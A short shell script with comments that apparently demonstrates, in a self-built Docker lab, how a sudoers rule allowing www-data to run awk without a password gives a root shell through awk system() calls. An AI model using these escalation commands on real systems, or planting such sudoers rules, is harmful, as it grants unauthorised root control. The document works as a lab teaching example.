# Setup steps for Awk2Shell - not really a bug, more a dumb software issue, or a case of 'security by obscurity. 
docker run -d --name local_target php:8.2-apache
docker exec -u root local_target sh -c 'apt-get update && apt-get install -y sudo && echo "www-data ALL=(ALL) NOPASSWD: /usr/bin/awk" >> /etc/sudoers'
docker exec -it -u www-data local_target bash # Get uid=33 (www-data) with Docker, then get (root) in the next steps.

# Get a (root) prompt by running sudo awk system() to launch /bin/bash. (THE EXTRA BRACKETS ARE REDUNTANT)
echo | sudo awk 'system("/bin/bash")'

# Running id, and uname -a as (root) - you don't really need awk system(), as we got (root) earlier, but it's just funny.
sudo awk 'BEGIN {system("id")}'
sudo awk 'BEGIN {system("uname -a")}' 

# How to get the straight # prompt, without the background layout.
sudo awk 'BEGIN {system("/bin/bash --noprofile --norc")}'

# How to find the thing that causes this behaviour: www-data ALL=(ALL) NOPASSWD: /usr/bin/awk
grep "www-data" /etc/sudoers

# I'm not even calling this a bug, but it reminds me so much of OS Command Injection (CMi) on junk embedded stuff, that it's just too funny.
# There is a real way to make this a bug, with crappy SUID settings, and also by allowing a web server (like /usr/bin/httpd) to run as (root), but this is the fun way.
